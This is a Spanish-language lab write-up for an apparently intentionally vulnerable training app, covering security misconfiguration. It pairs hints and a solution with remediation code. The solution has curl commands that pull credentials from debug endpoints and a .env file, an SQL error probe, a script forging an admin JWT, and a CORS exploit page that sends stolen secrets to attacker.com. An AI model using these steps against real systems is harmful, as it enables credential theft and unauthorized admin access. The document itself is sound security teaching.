# LAB 08 - Configuracion de Seguridad Incorrecta

## Referencia OWASP: API8:2023 - Security Misconfiguration

---

## Objetivo

Identificar y explotar multiples errores de configuracion de seguridad en la plataforma CryptoVulnX para:

1. Acceder a endpoints de depuracion que exponen credenciales de base de datos, secretos JWT y claves de AWS.
2. Obtener el archivo `.env` directamente desde el navegador.
3. Extraer informacion sensible de headers HTTP verbosos.
4. Explotar la configuracion permisiva de CORS.
5. Utilizar el secreto JWT para forjar tokens de administrador.

---

## Contexto

La vulnerabilidad API8:2023 abarca un amplio espectro de errores de configuracion que exponen la API a ataques. Estos errores suelen ser resultado de configuraciones por defecto no endurecidas, funcionalidades de depuracion habilitadas en produccion, permisos excesivamente abiertos o headers informativos innecesarios.

En CryptoVulnX, se encuentran las siguientes misconfiguraciones:

- **Endpoints de depuracion sin autenticacion**: El panel `/api/v1/admin/debug.php` expone informacion del sistema (phpinfo, variables de entorno, credenciales de base de datos) sin requerir autenticacion alguna.
- **Archivo `.env` accesible via web**: El archivo de variables de entorno que contiene todos los secretos esta accesible en la raiz del servidor web.
- **Headers HTTP verbosos**: Todas las respuestas incluyen `X-Server-Version` y `X-Powered-By`, revelando versiones exactas del software.
- **CORS permisivo**: Todos los endpoints responden con `Access-Control-Allow-Origin: *`, permitiendo que cualquier sitio web malicioso realice solicitudes a la API.
- **Errores SQL en modo debug**: Los mensajes de error incluyen la consulta SQL completa, facilitando la construccion de inyecciones SQL.

---

## Endpoints Involucrados

| Metodo | Endpoint / Vector | Descripcion |
|--------|-------------------|-------------|
| `GET` | `/api/v1/admin/debug.php?action=info` | Expone contrasena de BD, secreto JWT, version PHP (sin auth) |
| `GET` | `/api/v1/admin/debug.php?action=env` | Variables de entorno: claves AWS, Stripe, etc. (sin auth) |
| `GET` | `/api/v1/admin/debug.php?action=phpinfo` | Salida completa de `phpinfo()` |
| `GET` | `/.env` | Archivo de configuracion con secretos accesible via navegador |
| `*` | Todos los endpoints | Headers `X-Server-Version`, `X-Powered-By` en cada respuesta |
| `*` | Todos los endpoints | CORS: `Access-Control-Allow-Origin: *` |
| `*` | Cualquier query invalida | Errores SQL en modo debug con texto completo de la consulta |

---

## Dificultad

**Baja** - Las misconfiguraciones son facilmente detectables con herramientas basicas o incluso un navegador web.

---

## Pistas

<details>
<summary>Pista 1 - Reconocimiento</summary>

Inspecciona los headers de respuesta de cualquier endpoint de la API. ¿Hay headers que revelen informacion sobre el servidor? Intenta acceder a rutas comunes de administracion como `/api/v1/admin/` y archivos de configuracion como `/.env`.

</details>

<details>
<summary>Pista 2 - Enumeracion de endpoints de depuracion</summary>

El endpoint `/api/v1/admin/debug.php` acepta un parametro `action` con diferentes valores. Prueba con `info`, `env` y `phpinfo`. Ninguno requiere autenticacion. Observa que `action=info` devuelve el secreto JWT (`jwt_secret`) utilizado para firmar todos los tokens.

</details>

<details>
<summary>Pista 3 - Forjar un token de administrador</summary>

Con el `jwt_secret` obtenido del endpoint de debug, puedes crear un token JWT con el campo `role` establecido en `admin`. Usa una herramienta como `python -c "import jwt; ..."` o jwt.io para generar el token forjado y acceder a endpoints protegidos de administracion.

</details>

---

## Solucion

### Paso 1: Analizar Headers HTTP

```bash
curl -s -I http://localhost/appsec/api/v1/auth/login.php
```

Respuesta esperada (headers relevantes):
```
HTTP/1.1 200 OK
X-Server-Version: Apache/2.4.52
X-Powered-By: PHP/8.1.2
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Content-Type: application/json
```

Los headers revelan: version exacta de Apache y PHP, y CORS completamente abierto.

---

### Paso 2: Acceder al Endpoint de Debug - Informacion del Sistema

```bash
curl -s http://localhost/appsec/api/v1/admin/debug.php?action=info
```

Respuesta esperada:
```json
{
  "status": "success",
  "debug_info": {
    "php_version": "8.1.2",
    "server_software": "Apache/2.4.52 (Ubuntu)",
    "document_root": "/var/www/html/appsec",
    "database": {
      "host": "localhost",
      "name": "cryptovulnx_db",
      "user": "cryptovulnx_admin",
      "password": "Cr1pt0VulnX_DB@2026!"
    },
    "jwt_secret": "supersecretkey_cryptovulnx_2026_changeme",
    "jwt_algorithm": "HS256",
    "debug_mode": true,
    "environment": "production"
  }
}
```

---

### Paso 3: Acceder a Variables de Entorno

```bash
curl -s http://localhost/appsec/api/v1/admin/debug.php?action=env
```

Respuesta esperada:
```json
{
  "status": "success",
  "environment_variables": {
    "APP_ENV": "production",
    "APP_DEBUG": "true",
    "DB_HOST": "localhost",
    "DB_NAME": "cryptovulnx_db",
    "DB_USER": "cryptovulnx_admin",
    "DB_PASS": "Cr1pt0VulnX_DB@2026!",
    "JWT_SECRET": "supersecretkey_cryptovulnx_2026_changeme",
    "AWS_ACCESS_KEY_ID": "AKIAIOSFODNN7EXAMPLE",
    "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "AWS_REGION": "us-east-1",
    "STRIPE_SECRET_KEY": "sk_live_51ABC123DEF456...",
    "STRIPE_WEBHOOK_SECRET": "whsec_abc123def456...",
    "REDIS_HOST": "127.0.0.1",
    "REDIS_PORT": "6379",
    "SMTP_PASSWORD": "smtp_pass_2026!"
  }
}
```

---

### Paso 4: Obtener phpinfo Completo

```bash
curl -s http://localhost/appsec/api/v1/admin/debug.php?action=phpinfo | head -100
```

Este endpoint devuelve la salida completa de `phpinfo()` en formato HTML, exponiendo toda la configuracion de PHP, modulos cargados, rutas del sistema, variables de compilacion, etc.

---

### Paso 5: Acceder al Archivo .env

```bash
curl -s http://localhost/appsec/.env
```

Respuesta esperada:
```
APP_NAME=CryptoVulnX
APP_ENV=production
APP_DEBUG=true
APP_URL=http://localhost/appsec

DB_HOST=localhost
DB_PORT=3306
DB_DATABASE=cryptovulnx_db
DB_USERNAME=cryptovulnx_admin
DB_PASSWORD=Cr1pt0VulnX_DB@2026!

JWT_SECRET=supersecretkey_cryptovulnx_2026_changeme
JWT_EXPIRATION=3600

AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=cryptovulnx-kyc-docs

STRIPE_KEY=pk_live_51ABC123DEF456...
STRIPE_SECRET=sk_live_51ABC123DEF456...

MAIL_PASSWORD=smtp_pass_2026!
```

---

### Paso 6: Provocar un Error SQL para Obtener la Consulta

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"email":"test'\''","password":"x"}'
```

Respuesta esperada:
```json
{
  "status": "error",
  "message": "Database error",
  "debug": {
    "sql_error": "You have an error in your SQL syntax; check the manual...",
    "sql_query": "SELECT * FROM users WHERE email = 'test'' AND password_hash = '9dd4e461268c8034f5c8564e155c67a6'",
    "error_code": 1064
  }
}
```

---

### Paso 7: Forjar un Token JWT de Administrador

Con el secreto JWT obtenido (`supersecretkey_cryptovulnx_2026_changeme`), forjar un token de admin:

```bash
# Instalar PyJWT si no esta disponible
pip install PyJWT 2>/dev/null

# Generar token de administrador forjado
ADMIN_TOKEN=$(python3 -c "
import jwt, time
payload = {
    'sub': 1,
    'email': 'admin@cryptovulnx.com',
    'role': 'admin',
    'iat': int(time.time()),
    'exp': int(time.time()) + 86400
}
token = jwt.encode(payload, 'supersecretkey_cryptovulnx_2026_changeme', algorithm='HS256')
print(token)
")

echo "Token de admin forjado: $ADMIN_TOKEN"
```

**Paso 8**: Usar el token forjado para acceder a funcionalidades de administrador.

```bash
# Acceder al panel de administracion con el token forjado
curl -s http://localhost/appsec/api/v1/admin/users.php \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

Respuesta esperada:
```json
{
  "status": "success",
  "total_users": 1542,
  "users": [
    {"id": 1, "email": "admin@cryptovulnx.com", "role": "admin", "balance_usdt": 150000},
    {"id": 2, "email": "user1@test.com", "role": "user", "balance_usdt": 5200},
    ...
  ]
}
```

---

### Paso 8: Explotar CORS Permisivo

Crear un archivo HTML malicioso que explote el CORS abierto para robar datos:

```html
<!-- exploit_cors.html - Alojado en sitio del atacante -->
<script>
// El CORS: * permite que cualquier origen haga peticiones
fetch('http://localhost/appsec/api/v1/admin/debug.php?action=env')
  .then(response => response.json())
  .then(data => {
    // Enviar los secretos al servidor del atacante
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(data)
    });
    console.log('Secretos exfiltrados:', data);
  });
</script>
```

---

## Remediacion

### 1. Eliminar o Proteger Endpoints de Depuracion

```php
<?php
// admin/debug.php - ELIMINAR EN PRODUCCION o proteger estrictamente

// Opcion A: Eliminar el archivo completamente en produccion
// rm admin/debug.php

// Opcion B: Si es necesario mantenerlo, proteger con autenticacion fuerte
require_once __DIR__ . '/../middleware/auth.php';
require_once __DIR__ . '/../middleware/role_check.php';

$decoded = authenticateRequest(); // Verificar JWT
requireRole($decoded, 'superadmin'); // Solo superadmin

// Verificar que estamos en entorno de desarrollo
if (getenv('APP_ENV') !== 'development') {
    http_response_code(404);
    echo json_encode(["error" => "Not found"]);
    exit;
}

// Ademas, verificar IP de origen
$allowed_ips = ['127.0.0.1', '::1', '10.0.0.0/8'];
if (!isIpAllowed($_SERVER['REMOTE_ADDR'], $allowed_ips)) {
    http_response_code(403);
    echo json_encode(["error" => "Forbidden"]);
    exit;
}
```

### 2. Proteger el Archivo .env con Apache

```apache
# .htaccess en la raiz del proyecto

# Bloquear acceso a archivos ocultos y de configuracion
<FilesMatch "^\.">
    Require all denied
</FilesMatch>

# Bloquear archivos de configuracion especificos
<FilesMatch "\.(env|ini|log|conf|sql|bak)$">
    Require all denied
</FilesMatch>

# Desactivar listado de directorios
Options -Indexes

# Desactivar la firma del servidor
ServerSignature Off
```

### 3. Configurar CORS Restrictivo

```php
<?php
// middleware/cors.php

$allowed_origins = [
    'https://cryptovulnx.com',
    'https://app.cryptovulnx.com',
    'https://admin.cryptovulnx.com'
];

$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (in_array($origin, $allowed_origins)) {
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization");
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Max-Age: 3600");
} else {
    // No enviar headers CORS para origenes no permitidos
}

// Manejar preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}
```

### 4. Eliminar Headers Verbosos

```php
<?php
// middleware/security_headers.php

// Eliminar headers que revelan informacion
header_remove('X-Powered-By');
header_remove('Server');
header_remove('X-Server-Version');

// Agregar headers de seguridad
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
header("Content-Security-Policy: default-src 'self'");
header("Referrer-Policy: strict-origin-when-cross-origin");
header("Permissions-Policy: geolocation=(), camera=(), microphone=()");
```

Adicionalmente en `php.ini`:

```ini
; php.ini
expose_php = Off
display_errors = Off
log_errors = On
error_log = /var/log/php/error.log
```

### 5. Manejo de Errores Seguro (Sin Exposicion de Consultas SQL)

```php
<?php
// helpers/error_handler.php

function handleDatabaseError(PDOException $e, string $context = ''): void {
    // Registrar error completo en logs internos (NUNCA al usuario)
    error_log(sprintf(
        "[DB_ERROR] Context: %s | Code: %s | Message: %s | File: %s:%d",
        $context,
        $e->getCode(),
        $e->getMessage(),
        $e->getFile(),
        $e->getLine()
    ));

    // Respuesta generica al usuario
    http_response_code(500);
    echo json_encode([
        "status" => "error",
        "message" => "Error interno del servidor. Contacte al administrador.",
        "reference_id" => bin2hex(random_bytes(8)) // ID para correlacionar con logs
    ]);
    exit;
}

// Uso en los endpoints:
try {
    $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
    $stmt->execute([$email]);
} catch (PDOException $e) {
    handleDatabaseError($e, "user_login");
}
```

### 6. Desactivar Modo Debug en Produccion

```php
<?php
// config/app.php

$app_env = getenv('APP_ENV') ?: 'production';

// NUNCA habilitar debug en produccion
define('APP_DEBUG', $app_env === 'development');

if (!APP_DEBUG) {
    // Desactivar reporte de errores al usuario
    ini_set('display_errors', '0');
    ini_set('display_startup_errors', '0');
    error_reporting(0);

    // Configurar manejador de errores personalizado
    set_error_handler(function ($severity, $message, $file, $line) {
        error_log("[$severity] $message in $file:$line");
        return true; // No propagar al usuario
    });

    set_exception_handler(function (Throwable $e) {
        error_log("[EXCEPTION] " . $e->getMessage() . " in " . $e->getFile() . ":" . $e->getLine());
        http_response_code(500);
        echo json_encode([
            "status" => "error",
            "message" => "Error interno del servidor"
        ]);
    });
}
```
